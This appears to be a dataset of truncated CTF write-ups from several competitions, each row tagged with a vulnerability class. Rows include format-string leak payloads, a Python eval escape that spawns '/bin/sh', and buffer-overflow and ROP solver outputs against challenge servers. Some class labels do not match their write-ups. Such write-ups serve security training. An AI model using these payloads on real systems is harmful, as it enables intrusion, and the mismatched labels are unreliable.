ctf_writeup,writeups-39,writeups,csaw-quals-2015/pwn/precision/sudhackar/README.md,sudhackar,command_injection,"[](ctf=csaw-quals-2015) [](type=pwn) [](tags=stack-cookie,buffer-overflow) We are given a [file](../precision_a8f6f0590c177948fe06c76a1831e650) ```bash $ file precision_a8f6f0590c177948fe06c76a1831e650 precision_a8f6f0590c177948fe06c76a1831e650: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=929fc6f283d6f6c3c039ee19bc846e927103ebcd, not stripped ``` Lets disass main ```objdump 0x0804851d <+0>: push ebp 0x0804851e <+1>: mov ebp,esp 0x08048520 <+3>: and esp,0xfffffff0 0x08048523 <+6>: sub esp,0xa0 0x08048529 <+12>: fld QWORD PTR ds:0x8048690 0x0804852f <+18>: fstp QWORD PTR [esp+0x98] 0x08048536 <+25>: mov eax,ds:0x804a040 0x0804853b <+30>: mov DWORD PTR [esp+0xc],0x0 0x08048543 <+38>: mov DWORD PTR [esp+0x8],0x2 0x0804854b <+46>: mov DWORD PTR [esp+0x4],0x0 0x08048553 <+54>: mov DWORD PTR [esp],eax 0x08048556 <+57>: call 0x8048400 <setvbuf@plt> 0x0804855b <+62>: lea eax,[esp+0x18] 0x0804855f <+66>: mov DWORD PTR [esp+0x4],eax 0x08048563 <+70>: mov DWORD PTR [esp],0x8048678 0x0804856a <+77>: call 0x80483b0 <printf@plt> 0x0804856f <+82>: lea eax,[esp+0x18] 0x08048573 <+86>: mov DWORD PTR"
ctf_writeup,writeups-40,writeups,csaw-quals-2015/forensics/flash/chaitan94/README.md,chaitan94,other,"[](ctf=csaw-quals-2015) [](type=forensics) [](tags=) [](tools=) [](techniques=) # Flash (forensics-100) This was surprisingly very easy problem. After downloading the given [.img file](https://drive.google.com/file/d/0B_zt1fDAjfM_ZHJkSjdTYThPdmc/view), just running _strings_ on it gives away the flag: ```bash $ strings flash_c8429a430278283c0e571baebca3d139.img | grep flag{ ``` Aaand there's our flag: > flag{b3l0w_th3_r4dar}"
ctf_writeup,writeups-41,writeups,csaw-quals-2015/forensics/transfer/sudhackar/README.md,sudhackar,other,"[](ctf=csaw-quals-2015) [](type=forensics) [](tags=packet,) [](tools=wireshark) [](techniques=) We are given a [pcap]() file. On viewing in Wireshark and looking around we see some python code. Follow the TCP stream to get [file](../transfer.py) ```python import string import random from base64 import b64encode, b64decode FLAG = 'flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}' enc_ciphers = ['rot13', 'b64e', 'caesar'] # dec_ciphers = ['rot13', 'b64d', 'caesard'] def rot13(s): _rot13 = string.maketrans(""ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz"",""NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm"") return string.translate(s, _rot13) def b64e(s): return b64encode(s) def caesar(plaintext, shift=3): alphabet = string.ascii_lowercase shifted_alphabet = alphabet[shift:] + alphabet[:shift] table = string.maketrans(alphabet, shifted_alphabet) return plaintext.translate(table) def encode(pt, cnt=5): tmp = '2{}'.format(b64encode(pt)) for cnt in xrange(cnt): c = random.choice(enc_ciphers) i = enc_ciphers.index(c) + 1 _tmp = globals()[c](tmp) tmp = '{}{}'.format(i, _tmp) print tmp,c,i return tmp if __name__ == '__main__': print encode(FLAG) #2Mk16Sk5iakYxVFZoS1RsWnZXbFZaYjFaa1prWmFkMDVWVG"
ctf_writeup,writeups-42,writeups,csaw-quals-2015/crypto/whiter0se/chaitan94/README.md,chaitan94,other,"[](ctf=csaw-quals-2015) [](type=crypto) [](tags=cryptogram) [](tools=rumkin) [](techniques=) # whiter0se (crypto-50) We are given the cipher text: EOY XF, AY VMU M UKFNY TOY YF UFWHYKAXZ EAZZHN. UFWHYKAXZ ZNMXPHN. UFWHYKAXZ EHMOYACOI. VH'JH EHHX CFTOUHP FX VKMY'U AX CNFXY FC OU. EOY VH KMJHX'Y EHHX IFFQAXZ MY VKMY'U MEFJH OU. Could this be ceasar cipher? Let's check all 26 shifts: ``` yis rzz us pgo g oezhs nis sz ozqbseurt yuttbhb ozqbseurt thgrjbhb ozqbseurt ybgisuwicb pbudb ybbr wzniobj zr pegsuo ur whzrs zw iob yis pb egdbrus ybbr czzkurt gs pegsuo gyzdb iob zjt saa vt qhp h pfait ojt ta parctfvsu zvuucic parctfvsu uihskcic parctfvsu zchjtvxjdc qcvec zccs xaojpck as qfhtvp vs xiast ax jpc zjt qc fhecsvt zccs daalvsu ht qfhtvp hzaec jpc aku tbb wu riq i qgbju pku ub qbsdugwtv awvvdjd qbsdugwtv vjitldjd qbsdugwtv adikuwyked rdwfd addt ybpkqdl bt rgiuwq wt yjbtu by kqd aku rd gifdtwu addt ebbmwtv iu rgiuwq iabfd kqd blv ucc xv sjr j rhckv qlv vc rctevhxuw bxwweke rctevhxuw wkjumeke rctevhxuw bejlvxzlfe sexge beeu zcqlrem cu shjvxr xu zkcuv cz lre blv se hjgeuxv beeu fccnxuw jv shjvxr jbcge lre cmw vdd yw tks k sidlw rmw wd sdufwiyvx cyxxflf sdufwiyvx xlkvnflf sdufwiyvx cfkmwyamgf "
ctf_writeup,writeups-43,writeups,tum-ctf-teaser-2015/pwn/greeter/sudhackar/README.md,sudhackar,format_string,"[](ctf=tum-ctf-teaser-2015) [](type=pwn) [](tags=format-string) #greeter (pwn 15) ```bash $ file ./greeter ./greeter: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2657dbbc9fbf7a266d2d963b4644d1c3b44d8304, not stripped ``` So we have a not stripped file. ```bash $ ./greeter Hi, what's your name? AAAAA Pwn harder, AAAAA! ``` We can send in a name. It suffers form format string vulnerability. ``` $ ./greeter Hi, what's your name? %x.%x Pwn harder, b5eeae30.7227d7a0! ``` A little bit of analysis shows that the file reads in flag.txt to an address called flag which is not on the stack. Its on the heap. Since it is not on the stack we can't use repeated %x to read it. Also since the file is not stripped we can see the locations of each variable. ```bash gdb-peda$ p &flag $1 = (char (*)[256]) 0x600ca0 <flag> ``` %s is a format specifier that prints out a string ftarting from a given pointer. Now just figure out the offset. ```bash $ python -c 'print ""%x%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.AAAA""' | ./greeter Hi, what's your name? Pwn harder, ffa0b88010c3b7a0.1096f620.10"
ctf_writeup,writeups-44,writeups,tum-ctf-teaser-2015/rev/whitebox crypto/sudhackar/README.md,sudhackar,command_injection,"[](ctf=tum-ctf-teaser-2015) [](type=rev) [](tags=xtea) [](tool=pwntools) # whitebox crypto (rev 20) So we have an [executable](../xtea) Problem statement ``` Do not panic, it's only XTEA! I wonder what the key was... ``` Little bit of google we get this piece of code from [Wikipedia](https://en.wikipedia.org/wiki/XTEA) ```c void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0=v[0], v1=v[1], sum=0, delta=0x9E3779B9; for (i=0; i < num_rounds; i++) { v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + key[sum & 3]); sum += delta; v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + key[(sum>>11) & 3]); } v[0]=v0; v[1]=v1; } ``` Given file ```bash $ file ./xtea ./xtea: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=331f96cc8eefbf07d5752cf9e8cf4facb32ba8ff, not stripped ``` A little bit of analysis shows we have to give something as argv[1] of length 16 as input ```bash $ ./xtea AAAAAAAAAAAAAAAA 4a584fe6 116e650b ``` It returns the input ""encrypted"". We have to find the key. The code from Wikipedia says key[4] would be having 4 blocks of length "
ctf_writeup,writeups-45,writeups,tum-ctf-teaser-2015/crypto/bad_apple/sudhackar/README.md,sudhackar,other,"[](ctf=tum-ctf-teaser-2015) [](type=crypto) [](tags=hash-length-extension-attack) [](tool=hashpump) # bad_apple (crypto 15) ``` Baby's 1st ctf.link/assets/downloads/cry/bad_apple.tar.xz try: ncat 1.ctf.link 1027 < good.bin expect: ""hello"" ``` We are given a [tar archive](../bad_apple.tar.xz) It has a python file which is probably the source of the service ```python #!/usr/bin/env python3 import sys, binascii from Crypto.Hash import SHA256 key = open('key.bin', 'rb').read() message = sys.stdin.buffer.read(0x100) if len(message) < SHA256.digest_size: print('len') exit(0) tag, message = message[:SHA256.digest_size], message[SHA256.digest_size:] if SHA256.new(key + message).digest() != tag: print('bad') exit(0) if b'hello pls' in message: print('hello') if b'flag pls' in message: print(open('flag.txt', 'r').read()) ``` Also ```bash $ xxd good.bin 0000000: 2628 455f 6617 ecea 0248 95a4 8578 ebce &(E_f....H...x.. 0000010: 00fa 9204 983d 09b6 d175 7d05 dc43 0567 .....=...u}..C.g 0000020: 6865 6c6c 6f20 706c 73 hello pls ```` We see that the service uses sha256 to verify the signature and then process the message. We can use hash [Length Extension Attack](https://en.wikipedia.org/wiki/Leng"
ctf_writeup,writeups-46,writeups,whitehat-grand-prix-quals-2015/reversing/dong wan/sudhackar/README.md,sudhackar,format_string,"[](ctf=whitehat-grand-prix-quals-2015) [](type=analysis,reverse) [](tags=base64) [](tools=gdb-peda) [](techniques=) #Dong Van (RE - 100) So we have a [zip](../re100_35d14595b17756b79556f6eca775c31a.zip). ```bash $ file Re100 Re100: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=6c7c0504ab2f342427f59846298e97f9e4fbb98f, not stripped $ ./Re100 Input your secret: AAAA Too bad :( ``` So its checking for a password. A strings on the binary will tell us. ```bash $ strings ./Re100 . . stoull %llu ELF8n0BKxOCbj/WU9mwle4cG6hytqD+P3kZ7AzYsag2NufopRSIVQHMXJri51Tdv 0000 Input your secret: ms4otszPhcr7tMmzGMkHyFn= Good boy! Submit your flag :) Too bad :( . . ``` We see some base64 here. But it doesn't work. So we'll load it up in gdb. When we run it we see the input we pass is given on to a function change() and the output is matched with ms4otszPhcr7tMmzGMkHyFn=. So this uses a custom encoding technique. Stepping through the program we see that the program uses 'ELF8n0BKxOCbj/WU9mwle4cG6hytqD+P3kZ7AzYsag2NufopRSIVQHMXJri51Tdv' as its character set in the same fasion as normal Base64. So we wr"
ctf_writeup,writeups-47,writeups,teaser-dragon-ctf-2019/misc/PlayCAP/jaiverma/README.md,jaiverma,other,"[](ctf=teaser-dragon-ctf-2019) [](type=misc) [](tags=pcap,html5,usb) [](tools=wireshark,tshark) # PlayCAP We are given an [HTML5 application](../app.html) and a [pcagng](../PlayCAP.pcapng). The packet capture file has a bunch of USB traffic (`URB Interrupt` packets). More information about the USB filter fields can be found at the [Wireshark USB reference page](https://www.wireshark.org/docs/dfref/u/usb.html). ```sh $ tshark -r ../PlayCAP.pcapng -V | less Frame 1: 36 bytes on wire (288 bits), 36 bytes captured (288 bits) on interface 0 Interface id: 0 (\\.\pipe\wireshark_extcap_\\.\USBPcap1_20190918154451) Interface name: \\.\pipe\wireshark_extcap_\\.\USBPcap1_20190918154451 Encapsulation type: USB packets with USBPcap header (152) Arrival Time: Sep 18, 2019 19:16:10.716963000 IST [Time shift for this packet: 0.000000000 seconds] Epoch Time: 1568814370.716963000 seconds [Time delta from previous captured frame: 0.000000000 seconds] [Time delta from previous displayed frame: 0.000000000 seconds] [Time since reference or first frame: 0.000000000 seconds] Frame Number: 1 Frame Length: 36 bytes (288 bits) Capture Length: 36 bytes (288 bits) [Frame is marked: False] [Frame is ignored: F"
ctf_writeup,writeups-48,writeups,utctf-2020/pwn/bof/jaiverma/README.md,jaiverma,buffer_overflow,"[](ctf=utctf-2020) [](type=pwn) [](tags=buffer-overflow) [](tools=gdb,python) # bof We are given an `x86_64` [binary](../pwnable) with a simple stack based buffer overflow. The binary is compiled with `NX` enabled. ```sh gdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial ``` There is a function `get_flag` which spawns a shell if given `0xdeadbeef` as an argument in `rdi`. ```asm gdb-peda$ disass get_flag Dump of assembler code for function get_flag: 0x00000000004005ea <+0>: push rbp 0x00000000004005eb <+1>: mov rbp,rsp 0x00000000004005ee <+4>: sub rsp,0x20 0x00000000004005f2 <+8>: mov DWORD PTR [rbp-0x14],edi 0x00000000004005f5 <+11>: cmp DWORD PTR [rbp-0x14],0xdeadbeef 0x00000000004005fc <+18>: jne 0x400628 <get_flag+62> 0x00000000004005fe <+20>: mov QWORD PTR [rbp-0x10],0x400700 0x0000000000400606 <+28>: mov QWORD PTR [rbp-0x8],0x0 0x000000000040060e <+36>: mov rax,QWORD PTR [rbp-0x10] 0x0000000000400612 <+40>: lea rcx,[rbp-0x10] 0x0000000000400616 <+44>: mov edx,0x0 0x000000000040061b <+49>: mov rsi,rcx 0x000000000040061e <+52>: mov rdi,rax 0x0000000000400621 <+55>: call 0x400490 <execve@plt> 0x0000000000400626 <+60>: jmp 0x400629"
ctf_writeup,writeups-49,writeups,utctf-2020/pwn/zurk/jaiverma/README.md,jaiverma,format_string,"[](ctf=utctf-2020) [](type=pwn) [](tags=format-string,shellcode) [](tools=gdb,pwntools,python) # zurk We are given a [binary](../pwnable) and [libc](../libc-2.23.so). The binary has a format string vulnerability and it has lots of exectuable regions. ```sh gdb-peda$ vmmap Start End Perm Name 0x00400000 0x00401000 r-xp /home/jai/Documents/ctf/utctf/pwn/zurk/pwnable 0x00600000 0x00601000 r-xp /home/jai/Documents/ctf/utctf/pwn/zurk/pwnable 0x00601000 0x00602000 rwxp /home/jai/Documents/ctf/utctf/pwn/zurk/pwnable 0x00007ffff7dce000 0x00007ffff7f8a000 r-xp /usr/lib/libc-2.31.so 0x00007ffff7f8a000 0x00007ffff7f8d000 r-xp /usr/lib/libc-2.31.so 0x00007ffff7f8d000 0x00007ffff7f90000 rwxp /usr/lib/libc-2.31.so 0x00007ffff7f90000 0x00007ffff7f96000 rwxp mapped 0x00007ffff7fcd000 0x00007ffff7fd0000 r--p [vvar] 0x00007ffff7fd0000 0x00007ffff7fd1000 r-xp [vdso] 0x00007ffff7fd1000 0x00007ffff7ffb000 r-xp /usr/lib/ld-2.31.so 0x00007ffff7ffc000 0x00007ffff7ffd000 r-xp /usr/lib/ld-2.31.so 0x00007ffff7ffd000 0x00007ffff7ffe000 rwxp /usr/lib/ld-2.31.so 0x00007ffff7ffe000 0x00007ffff7fff000 rwxp mapped 0x00007ffffffde000 0x00007ffffffff000 rwxp [stack] 0xffffffffff600000 0xffffffffff601000 --xp [vsysca"
ctf_writeup,writeups-50,writeups,utctf-2020/reverse/basics_reverse_engineering/jaiverma/README.md,jaiverma,other,[](ctf=utctf-2020) [](type=reversing) [](tags=strings) [](tools=strings) # [Basics] Reverse Engineering Running `strings` on the binary gives us the flag. ``` $ strings calc ... utflag{str1ngs_1s_y0ur_fr13nd} ... ```
ctf_writeup,writeups-51,writeups,utctf-2020/reverse/png2/jaiverma/README.md,jaiverma,other,"[](ctf=utctf-2020) [](type=reversing) [](tags=png) [](tools=PIL,python,xxd) # PNG2 We are given a [binary file](../pic.png2). ``` $ xxd pic.png2 | head 00000000: 504e 4732 7769 6474 683d 05cf 6865 6967 PNG2width=..heig 00000010: 6874 3d02 887f 7f7f 7f7f 7f7f 7f7f 7f7f ht=............. 00000020: 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f ................ 00000030: 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f ................ 00000040: 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f ................ 00000050: 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f ................ 00000060: 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f ................ 00000070: 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f ................ 00000080: 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f ................ 00000090: 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f 7f7f ................ ``` Reading the `width` and `height` as big endian `uint16's` and passing the pixel data to `PIL` gives us the image. Script is [here](./solve.py). ![](./flag.png)"
ctf_writeup,writeups-52,writeups,utctf-2020/reverse/babymips/jaiverma/README.md,jaiverma,other,"[](ctf=utctf-2020) [](type=reversing) [](tags=mips) [](tools=ghidra) # babymips We are given a `MIPS` [binary](../baby). Opening the binary in `Ghidra` in decompiler view gives us the simple algorithm used to compare our input against bytes stored in the binary. ```py from pwn import * e = ELF('./baby') buf = e.read(0x4015f4, 0x54) s = bytearray(0x4e) for i in range(0x4e): x = buf[i] ^ (i + 0x17) s[i] = x print(bytes(s).decode('utf-8')) ```"
ctf_writeup,writeups-53,writeups,whitehat-contest-11-2016/RE/RE3/sudhackar/README.md,sudhackar,command_injection,"[](ctf=whitehat-contest-11-2016) [](type=rev) [](tags=py2exe) [](tool=unpy2exe) # RE3 (rev 100) So we have an [exe file](../digital_fortrees.exe) ```bash $ file digital_fortrees.exe digital_fortrees.exe: PE32 executable (console) Intel 80386, for MS Windows $ strings digital_fortrees.exe !This program cannot be run in DOS mode. . . <pythondll> LoadLibrary(pythondll) failed . ``` This suggests the executable was made using [py2exe](http://www.py2exe.org/). Byte compiled pyc files can be easily fished out from such exe using [unpy2exe](https://github.com/matiasb/unpy2exe). We take out the pyc file and then use [Easy Python Decompiler](https://sourceforge.net/projects/easypythondecompiler/) to get ```python # Embedded file name: digital_fortrees.py import urllib2 def main(): print "" /\\\n /`:\\\n /`'`:\\\n /`'`'`:\\\n /`'`'`'`:\\\n /`'`'`'`'`:\\\n |`'`'`'`:|\n _ _ _ _ _ |] ,-. :|_ _ _ _\n ||| || || || | | |_| ||| || || || |\n |`' `' `' `'.| | _'=' |`' `' `' `'.|\n : .:; |'-' : .:;\n \\-..____..:/ _ _ _ _ _ _| _ _'-\\-..____..:/\n :--------:_,' || || || || || || || `.::--------:\n |] .:|:. `' `'_`' `' `' `' `' | '-' .:|\n | ,-. .[|:._ '-' ____ ___ | ,-.'-|\n | | | .:|'--'_ ,'____`. '--"
ctf_writeup,writeups-54,writeups,whitehat-contest-11-2016/RE/RE1/abishek/README.md,abishek,other,[](ctf=whitehat-contest-11-2016) [](type=rev) [](tool=IDApro) # RE3 (rev 100) We're given the Binary. When opened and analysed with IDA and exported the C file we come across the code line below. ![bump](files/code.png) Thus understanding the codeline yields the following to be the tokens. 1.{53fc275d81daf29f5903053ed5be8c4938ae4efd} 2.{53fc275d81053ed5be8cdaf29f59034938ae4efd} When input the token results True which gives the flag. ![bump](files/terminal.png)
ctf_writeup,writeups-55,writeups,plaid-ctf-2020/web/contrived/zevtnax/README.md,zevtnax,command_injection,"# [Web] Contrived Web Problem - 350 *Warning*: This writeup is a creation of my lonely quarantined mind. It may be longer than required. If you're busy, jump to [the Attack Plan](#The-Attack-Plan). This was an exciting challenge in PlaidCTF 2020. Let's dive right in! The source code for a web app is given: ![](https://i.imgur.com/utcVnKb.png) As you can see, there are 6(!) services. Before going through all of them, I quickly grepped for `flag`: ![](https://i.imgur.com/sKPPDeM.png) Aha! Now we know where the flag is. It's in the `/flag.txt` file in the services which use the `services.dockerfile` Dockerfile. A quick look into `docker-compose.yml` reveals that only `api`, `server` and `email` services use this dockerfile. So, it's clear that only these services can read the flag. This will come in handy. ## Exploration Let's get a broad overview of what the services do: - The **api** service has the following endpoints: - `/register` - allows the user to create an account - `/login` - allows the user to login - `/password-reset` - sends the password and email it to the user - `/self` - returns info. about logged in user - `/profile` - Allows user to upload a profile image. The image"
ctf_writeup,writeups-56,writeups,b01lers-ctf-2020/pwn/department_of_flying_vehicles/jaiverma/README.md,jaiverma,buffer_overflow,"[](ctf=b01lers-ctf-2020) [](type=pwn) [](tags=buffer-overflow) [](tools=ida) # department of flying vehicles We are given a [binary](../dfv) which has a buffer overflow due to a call to `gets`. The program reads user input and xors it with a key. It then compares that to a hardcoded value. Basically it does the following: ```python xor_key = 0x1052949205934052 xor_value = 0x5641444C4F4F43 # hex for 'COOLDAV' xor_result = xor_key ^ xor_value s = gets() # buffer overflow here if (s ^ xor_result != xor_value): # fail else: # checks if the first 8 characters of our input are # 'COOLDAV\x00' using strncmp # if they aren't we get the flag! ``` ![](./ida.png) Using the buffer overflow, we can modify the `xor_key`, `xor_value`, and `xor_result` to make `strncmp` to fail and give us the flag. Running the [solver script](./solve.py) ```sh $ python solve.py [+] Opening connection to pwn.ctf.b01lers.com on port 1001: Done b""\nIf you can please make it work, we'll reward you!\n\nWelcome to the Department of Flying Vehicles.\nWhich liscense plate would you like to examine?\n > "" b""Thank you so much! Here's your reward!\npctf{sp4c3_l1n3s_R_sh0r7!}\n"" ```"
ctf_writeup,writeups-57,writeups,b01lers-ctf-2020/pwn/xwing_part1/jaiverma/README.md,jaiverma,other,"[](ctf=b01lers-ctf-2020) [](type=pwn) [](tags=misc) [](tools=) # X-Wing Part 1 This was more of a misc challenge than a pwn. We are given a link to a YouTube video. The video contains a link to a URL which has the actual challenge. You can see the link here: - [https://youtu.be/bYAoGTywR5c?t=3](https://youtu.be/bYAoGTywR5c?t=3) - [http://xwing.pwn.ctf.b01lers.com/](http://xwing.pwn.ctf.b01lers.com/) Viewing the source of this page, there is a `Dockerfile`. ```Dockerfile FROM archlinux:20200106 # Change example to the name of your challenge. ENV USER xwing WORKDIR /home/$USER RUN useradd -ms /bin/bash $USER RUN pacman -Sy gcc make xinetd --noconfirm COPY $USER.xinetd /etc/rc.d/$USER COPY $USER.c /home/$USER/ COPY memdump.c /home/$USER/ COPY memdump.h /home/$USER/ COPY $USER.Makefile /home/$USER/Makefile COPY $USER.sh /home/$USER/$USER.sh COPY flag1.txt /home/$USER/flag1.txt COPY flag2.txt /home/$USER/flag2.txt COPY flag3.txt /home/$USER/flag3.txt COPY flag4.txt /home/$USER/flag4.txt RUN make -C /home/$USER/ RUN chown -R root:$USER /home/$USER RUN chmod -R 550 /home/$USER RUN chmod -x /home/$USER/flag1.txt RUN chmod -x /home/$USER/flag2.txt RUN chmod -x /home/$USER/flag3.txt RUN chmo"
ctf_writeup,writeups-58,writeups,b01lers-ctf-2020/pwn/black_hole/jaiverma/README.md,jaiverma,buffer_overflow,"[](ctf=b01lers-ctf-2020) [](type=pwm) [](tags=buffer-overflow,rop) [](tools=ropgadget,gdb,python) # black hole We are given a [binary](../black-hole) with a stack-based buffer overflow. The buffer-overflow can be turned into an arbitrary write by overwriting a variable on the stack which is used as the offset to the input buffer. User input is read 1 byte at a time using repeated calls to `read` until a newline character `\n` is encountered. ![](./ida.png) By overwriting the offset variable on the stack, we can overwrite the saved return address and build a ROP chain. I had so much trouble with alignment and testing this because I was running `Arch linux` and the server was running `Ubuntu 18.04`. The solver script is [here](./solve.py). ``` $ python solve.py ... Throttle: 3 Gravity: 17 O => | > $ d You lose aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xc0! Sorry, you died! You win, ./flag.txt! pctf{th1s_l1ttle_man0uver_just_c0st_us_51_y34r5} /home/black-hole/black-hole.sh: line 2: 2802 Segmentation fault (core dumped) ./black-hole [*] Got EOF while reading in interactive $ [*] Interrupt"
ctf_writeup,writeups-59,writeups,b01lers-ctf-2020/pwn/jumprive/jaiverma/README.md,jaiverma,format_string,"[](ctf=b01lers-ctf-2020) [](type=pwn) [](tags=format-string) [](tools=python) # jumpdrive The given [binary](../jumpdrive) has a format string vulnerability. The flag is stored on the stack. Using the format string vulnerability, we can leak the stack and get the flag. Solver script is [here](./solve.py). ```sh python solve.py [+] Opening connection to pwn.ctf.b01lers.com on port 1002: Done [+] Opening connection to pwn.ctf.b01lers.com on port 1002: Done [+] Opening connection to pwn.ctf.b01lers.com on port 1002: Done [+] Opening connection to pwn.ctf.b01lers.com on port 1002: Done b'pctf{pr1nTf_1z_4_St4R_m4p}\n\x00?\x7f\x00' ```"
ctf_writeup,writeups-60,writeups,b01lers-ctf-2020/reverse/train_arms/jaiverma/README.md,jaiverma,other,"[](ctf=b01lers-ctf-2020) [](type=reversing) [](tags=arm) [](tools=python) # train arms We are given an `ARM` assembly [source file](../main.s) and a [text file](result.txt) The source is simple enough and we can write a python script to give us the flag. ```asm .cpu cortex-m0 .thumb .syntax unified .fpu softvfp .data flag: .string ""REDACTED"" //len = 28 .text .global main main: ldr r0,=flag eors r1,r1 eors r2,r2 movs r7,#1 movs r6,#42 loop: ldrb r2,[r0,r1] cmp r2,#0 beq exit lsls r3,r1,#0 ands r3,r7 cmp r3,#0 bne f1//if odd strb r2,[r0,r1] adds r1,#1 b loop f1: eors r2,r6 strb r2,[r0,r1] adds r1,#1 b loop exit: wfi ``` Running the [solver script](./solve.py) gives us the flag. ```sh $ python solve.py b'pctf{tr41ns_d0nt_h4v3_arms}\x00' ```"
ctf_writeup,writeups-61,writeups,b01lers-ctf-2020/reverse/dank_engine/jaiverma/README.md,jaiverma,other,"[](ctf=b01lers-ctf-2020) [](type=reversing) [](tags=game,re,godot) [](toosl=ghidra) # dank engine We are given a [zip file](../DankEngine.zip). This consists of: - DankEngine.pck - DankEngine.x86\_64 `DankEngine.x86_64` is a game written with the Godot game engine. Running `strings` on the `.pck` file, we can see that there is functionality to enable `God Mode` in the game. ``` 169 func zero_evt_release(): 170 self.g_cheat_stack.push_back(""0"") 171 if self.g_cheat_stack == [""P"", ""U"", ""R"", ""G"", ""0"", ""0""]: 172 self.g_god_mode = not self.g_god_mode 173 $CollisionShape2D.disabled = not $CollisionShape2D.disabled ``` All we have to do is enter 'PURG00' and then we can move arbitrarily in the game map and travel through walls. After travelling to the far-right in the map, we can see an image consisting of the flag. ![](./flag.png) Flag: `pctf{itwastimeforthomastogo_hehadseeneverything}`"
ctf_writeup,writeups-62,writeups,b01lers-ctf-2020/reverse/chugga_chugga/jaiverma/README.md,jaiverma,other,"[](ctf=b01lers-ctf-2020) [](type=reversing) [](tags=z3,angr) [](tools=z3) # chugga chugga We are given a [binary](../chugga) which has been written in `Go`. The `Go` binary which consists of a set of constraints that we can reverse and model with an SMT solver like `Z3`. We just have to find the function where the core logic lies and not waste our time with all the bloat that Go adds. The `main.main` function at `0x492eb0` is responsible for checking our input. Ghidra decompiler makes it easy for us to model the constraints: ```c void main.main(void) { undefined **ppuVar1; char cVar2; char cVar3; char *pcVar4; char *pcVar5; char **ppcVar6; char cVar7; byte bVar8; long in_FS_OFFSET; char **local_a0; undefined *local_28; undefined1 *local_20; undefined *local_18; char **local_10; ppcVar6 = local_a0; ppuVar1 = (undefined **)(*(long *)(in_FS_OFFSET + 0xfffffff8) + 0x10); if (&local_28 < *ppuVar1 || &local_28 == (undefined **)*ppuVar1) { runtime.morestack_noctxt(); main.main(); return; } runtime.newobject(); while( true ) { runtime.convT64(); local_28 = &DAT_004a4c40; local_20 = main.statictmp_2; local_18 = &DAT_004a4480; local_10 = local_a0; fmt.Fprintln(); fmt.Fprintln(); local_a0 = o"
ctf_writeup,writeups-63,writeups,Backdoor-CTF/pwn/worst-pwn-ever/abishek/README.md,abishek,command_injection,"## Worst Pwn Ever (Pwn) We get netcat connection parameters to work with. After connecting to the server we get a custom command-line prompt, but typing some random things cause the connection to close. Some fuzzing lead us to typing `1+()` which crashes with a nice python exception that we can't add int to a tuple. This means that our input has to be evaluated by python interpreter. We use this to run: ```python __import__(""pty"").spawn(""/bin/sh"") ``` To get a real shell on the target machine. After that we tried the standard aproach with `find flag` but it gave us nothing. Fortunately we came back to task description which stated that the admin is `environmentalist` and so we typed `set` to see evn variables and there was a variable named `_F_L_AG` containing the flag itself. "
ctf_writeup,writeups-64,writeups,Backdoor-CTF/rev/Debug/abishek/README.md,abishek,command_injection,"***DEBUG32*** *category:reverse engineering* *points:70* When the given binary was analysed it was found to be a 32-bit,stripped file. ```bash hulkbuster@Jarvis:~/Downloads$ file debug32 debug32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=46b87dea3b50c74ec8cde885ccc9a4d9e5e260f3, stripped ``` Opening the file with IDA,Analyxing the code flow, it is found that there exists a funtion that ""prints flag"". Now setting a random break point at an address then changing the pointer EIP to the above function's address prints the flag. ```bash gdb-peda$ file debug32 Reading symbols from debug32...(no debugging symbols found)...done. gdb-peda$ break *0x080483a0 Breakpoint 1 at 0x80483a0 gdb-peda$ r Starting program: /home/hulkbuster/Downloads/debug32 [----------------------------------registers-----------------------------------] EAX: 0xf7ffd938 --> 0x0 EBX: 0xf7ffd000 --> 0x22f08 ECX: 0x0 EDX: 0xf7fe91d0 (push ebp) ESI: 0xffffd7ec --> 0xffffd9b3 (""XDG_VTNR=2"") EDI: 0x80483a0 (xor ebp,ebp) EBP: 0x0 ESP: 0xffffd7e0 --> 0x1 EIP: 0x80483a0 (xor ebp,ebp) EFLAGS: 0x282 (carry parity adjust zero SI"
ctf_writeup,writeups-65,writeups,Backdoor-CTF/rev/Debug/abishek/files/README.md,files,other,The image and binary for the challenge is found here.
